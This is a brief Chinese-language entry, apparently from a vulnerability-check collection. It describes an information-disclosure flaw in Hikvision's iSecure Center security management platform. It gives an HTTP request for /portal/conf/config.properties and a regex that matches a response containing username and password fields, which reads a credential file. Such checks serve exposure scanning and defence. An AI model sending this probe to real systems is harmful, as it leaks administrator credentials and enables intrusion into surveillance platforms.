# HIKVISIONiSecureCenter综合安防管理平台信息泄露

海康 ｜ 信息泄露 ｜ —
- **请求**：`GET /portal/conf/config.properties HTTP/1.1`
- **响应特征**：200 ^(?=.*?username)(?=.*?password).*?$